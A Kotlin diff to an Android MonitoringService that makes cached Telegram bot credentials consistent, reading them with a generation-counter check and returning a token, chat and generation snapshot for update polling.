@@ -244,6 +244,8 @@ class MonitoringService : Service() {
     private var cachedOwnerId = 0L
     @Volatile
     private var cachedAccessPinActive = false
+    @Volatile
+    private var cachedCredGeneration = 0L
     private class PendingRestore(
         var stage: Int,
         var blob: String? = null,
@@ -1139,10 +1141,33 @@ class MonitoringService : Service() {
     private fun refreshCreds() {
         synchronized(credsLock) {
             try {
-                cachedBotToken = preferencesManager.botToken
-                cachedChatId = preferencesManager.chatId
-                cachedOwnerId = preferencesManager.ownerUserId
-                cachedAccessPinActive = preferencesManager.accessPin.isNotEmpty()
+                var stable = false
+                var generation = 0L
+                var token = ""
+                var chat = ""
+                var owner = 0L
+                var pinActive = false
+                var attempts = 0
+                while (!stable && attempts < 3) {
+                    attempts++
+                    val before = preferencesManager.credentialGeneration
+                    token = preferencesManager.botToken
+                    chat = preferencesManager.chatId
+                    owner = preferencesManager.ownerUserId
+                    pinActive = preferencesManager.accessPin.isNotEmpty()
+                    val after = preferencesManager.credentialGeneration
+                    if (before == after) {
+                        generation = before
+                        stable = true
+                    }
+                }
+                if (stable) {
+                    cachedBotToken = token
+                    cachedChatId = chat
+                    cachedOwnerId = owner
+                    cachedAccessPinActive = pinActive
+                    cachedCredGeneration = generation
+                }
             } catch (_: Exception) {
             }
         }
@@ -1477,13 +1502,18 @@ class MonitoringService : Service() {
     }
 
     private fun sendCreds(): Pair<String, String> {
+        val snapshot = credsSnapshot()
+        return snapshot.first to snapshot.second
+    }
+
+    private fun credsSnapshot(): Triple<String, String, Long> {
         if (cachedBotToken.isEmpty() || cachedChatId.isEmpty()) refreshCreds()
         val now = android.os.SystemClock.elapsedRealtime()
         if (now - credsCheckAt > 300_000L) {
             credsCheckAt = now
             refreshCreds()
         }
-        return synchronized(credsLock) { cachedBotToken to cachedChatId }
+        return synchronized(credsLock) { Triple(cachedBotToken, cachedChatId, cachedCredGeneration) }
     }
 
     private fun hasNetwork(): Boolean {
@@ -1642,10 +1672,10 @@ class MonitoringService : Service() {
             commandBackoffUntil = maxOf(commandBackoffUntil, android.os.SystemClock.elapsedRealtime() + rateRemainMs)
             return false
         }
-        val (botToken, chatId) = sendCreds()
+        val (botToken, chatId, snapshotGeneration) = credsSnapshot()
         if (botToken.isEmpty() || chatId.isEmpty()) return false
 
-        var responseGeneration = try { preferencesManager.credentialGeneration } catch (_: Exception) { 0L }
+        var responseGeneration = snapshotGeneration
         val offset = preferencesManager.lastUpdateId + 1
         val url = updatesUrl(botToken, offset)
 
@@ -1664,11 +1694,11 @@ class MonitoringService : Service() {
                 refreshCreds()
             } catch (_: Exception) {
             }
-            val (freshToken, freshChat) = sendCreds()
+            val (freshToken, freshChat, freshGeneration) = credsSnapshot()
             if (freshToken.isNotEmpty() && (freshToken != botToken || freshChat != chatId)) {
                 responseToken = freshToken
                 responseChat = freshChat
-                responseGeneration = try { preferencesManager.credentialGeneration } catch (_: Exception) { responseGeneration }
+                responseGeneration = freshGeneration
                 val retryOffset = (try { preferencesManager.lastUpdateId } catch (_: Exception) { 0L }) + 1
                 val retryUrl = updatesUrl(freshToken, retryOffset)
                 response = try {
